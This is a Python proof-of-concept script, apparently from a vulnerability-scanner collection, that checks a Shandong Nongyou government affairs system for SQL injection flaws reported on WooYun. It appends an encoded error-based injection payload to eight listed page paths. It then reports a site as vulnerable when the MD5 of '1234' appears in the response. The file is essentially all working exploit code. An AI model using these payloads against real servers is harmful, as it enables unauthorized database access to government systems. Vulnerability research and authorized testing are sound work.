#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 农友政务系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-095250
         http://www.wooyun.org/bugs/wooyun-2010-097690
author: Lucifer
description: 山东农友软件公司政务系统存在多处SQL注入漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        urls=['/ckq/pllistOut.aspx?tname=1&CountryName=test',
            '/ckq/caiwgkview.aspx?tname=1&CountryName=test',
            '/newsymItemView/DynamicItemViewOut.aspx?tname=test&CountryName=test',
            '/newsymsum/VillagePersonalView.aspx?tname=test&CountryName=test',
            '/symItemManage/ItemSixth.aspx?id=1',
            '/symItemManage/ItemSecond.aspx?id=1',
            '/WebDefault3.aspx?CountryName=test&level=0',
            '/ExtWebModels/WebFront/ShowNews.aspx?class=1&id=1%27AnD%20%28SeLeCt%206765%20FrOM%28SeLeCT%20CoUnT%28%2a%29%2CCOnCaT%28Md5%281234%29%2CFLooR%28RaNd%280%29%2a2%29%29x%20FrOm%20InFoRMaTION_ScHeMA.CHaRAcTER_SeTS%20GrOuP%20By%20x%29a%29%20AnD%27QXgv%27%3D%27QXgv']
        try:
            noexist = True
            for turl in urls:
                payload = "%27%20AnD%20%28SeLeCt%201%20FrOm%28SeLeCt%20CoUnT%28%2a%29%2CCoNcAt%28Md5%281234%29%2CFlOoR%28RaNd%280%29%2a2%29%29x%20FrOm%20InFOrMATiON_ScHeMA.CHaRaCTER_SeTS%20GrOuP%20By%20x%29a%29%20AnD%27svkA%27%3D%27svkA%26CountryName%3D1"
                vulnurl = url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    result[1]=  '存在'
                    result[0] = vulnurl
                    noexist = False
            if noexist:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
